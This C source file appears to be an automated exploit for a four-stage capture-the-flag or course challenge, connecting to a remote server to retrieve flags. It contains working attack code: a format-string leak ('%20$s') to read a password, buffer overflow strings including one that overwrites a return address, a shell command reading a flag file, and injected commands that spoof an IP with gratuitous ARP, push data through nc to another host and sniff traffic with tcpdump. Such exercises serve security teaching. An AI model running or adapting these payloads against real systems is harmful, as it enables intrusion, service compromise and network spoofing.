#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>

#define MAXLINE 1024

#define PUZZLE1 1
#define PUZZLE2 2
#define PUZZLE3 3
#define PUZZLE4 4

#define READ 0
#define WRITE 1

int main(int argc, char **argv)
{
    int sockfd, n, maxfd, state, op;
    char buffer[MAXLINE];
    struct sockaddr_in server_addr;
    fd_set allset, rset, wset;

    if(argc != 3) {
        printf("Usage: ./<program_name> <server_ip> <port> (./exploit 140.113.194.80 20037)\n");
        exit(0);
    }

    bzero(&server_addr, sizeof(server_addr) );
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(atoi(argv[2]));

    if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
        perror("socket error");
        exit(errno);
    }

    if(inet_pton(AF_INET, argv[1], &server_addr.sin_addr) <= 0) {
        perror("inet_pton error");
        exit(errno);
    }

    if(connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr) ) < 0) {
        perror("connect error");
        exit(errno);
    }

    maxfd = sockfd;
    FD_ZERO(&allset);
    FD_SET(sockfd, &allset);

    state = PUZZLE1;
    op = WRITE;

    while(1)
    {
        rset = wset = allset;
        select(maxfd + 1, &rset, &wset, NULL, NULL);

        if(FD_ISSET(sockfd, &rset) && op == READ)
        {
            char *ptr;

            n = read(sockfd, buffer, MAXLINE);
            if(n == 0) {
                printf("Server close the connection.\n");
                break;
            }
            buffer[n] = 0;

            // fputs(buffer, stdout);
            // fflush(stdout);

            // find if flag in the response
            if((ptr = strstr(buffer, "FLAG")) != NULL) {
                strtok(ptr, "\n");
                if(ptr[4] == ' ') {     // final flag
                    printf("FINAL %s\n", ptr);
                    exit(0);
                }
                else
                    printf("%s\n", ptr);
            }

            if(strstr(buffer, "GREAT!!") != NULL || state == PUZZLE4)
                op = WRITE;
        }

        if(FD_ISSET(sockfd, &wset) && op == WRITE)
        {
            if(state == PUZZLE1) {

                char format_str[] = "%20$s\n";
                char passwd[MAXLINE];
                char *ptr;

                // parse the response to get the password
                write(sockfd, format_str, strlen(format_str));
                while((n = read(sockfd, buffer, MAXLINE))) {
                    if(strstr(buffer, "\n") != NULL)
                        break;
                }

                if(strstr(buffer, "Your Input") != NULL) {
                    ptr = strtok(buffer, ":");
                    ptr = strtok(NULL, " \n");
                }
                else
                    ptr = strtok(buffer, "\n");

                // append newline to the password
                snprintf(passwd, sizeof(passwd), "%s\n", ptr);

                write(sockfd, passwd, strlen(passwd));
                
                state = PUZZLE2;
                op = READ;
            }
            else if(state == PUZZLE2) {

                char attack_string[] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\ndddddddddddd";
               
                write(sockfd, attack_string, strlen(attack_string));
               
                state = PUZZLE3;
                op = READ;
            }
            else if(state == PUZZLE3) {

                char attack_string[] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\xc0\x8d\x04\x08\n";
                char cat[] = "cat flag3_file\n";

                write(sockfd, attack_string, strlen(attack_string));
                write(sockfd, cat, strlen(cat));
                
                state = PUZZLE4;
            }
            else if(state == PUZZLE4) {

                char echo[] = "echo 1 > /writable-proc/sys/net/ipv4/ip_nonlocal_bind\n";
                char arping[] = "arping -c 1 -U -s 172.18.37.4 -I eth0 172.18.37.3\n";
                char nc[] = "while true; do echo 0556518; sleep 1; done | nc 172.18.37.3 9527 &\n";
				char tcpdump[] = "tcpdump -ennA -i eth0 src 172.18.37.3 and dst 172.18.37.4 and ether dst 02:42:ac:12:25:02 2>&1\n";

                write(sockfd, echo, strlen(echo));
                write(sockfd, arping, strlen(arping));
                write(sockfd, nc, strlen(nc));
                write(sockfd, tcpdump, strlen(tcpdump));

                op = READ;
            }   
        }
    }

    close(sockfd);

    return 0;
}